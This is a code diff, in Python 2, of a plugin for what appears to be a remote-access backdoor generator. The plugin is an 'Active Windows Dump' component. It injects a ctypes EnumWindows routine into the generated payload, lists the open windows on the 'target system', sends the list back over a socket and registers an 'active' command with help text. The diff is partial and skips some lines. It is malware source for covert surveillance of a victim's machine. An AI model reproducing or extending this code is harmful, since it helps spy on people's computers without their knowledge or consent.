@@ -8,7 +8,7 @@ def main(option):
     if option == 'generate':
         config.import_statements.append('import ctypes')
         config.functions.append('''
-def active_windows():
+def active():
     global IsWindowVisible
     EnumWindows = ctypes.windll.user32.EnumWindows
     EnumWindowsProc = ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.POINTER(ctypes.c_int), ctypes.POINTER(ctypes.c_int))
@@ -32,9 +32,10 @@ def active_windows():
     s.sendall(data + '\\n')''')
         config.logics.append('''
             elif command == "active":
-                active_windows()''')
+                active()''')
+        config.help_menu['active'] = 'Shows all open windows on the target system'
     elif option == 'info':
-        print '\nName             : Active Windows Dumping component' \
+        print '\nName             : Active Windows Dump component' \
               '\nOS               : Windows' \
               '\nRequired Modules : ctypes' \
               '\nCommands         : active' \
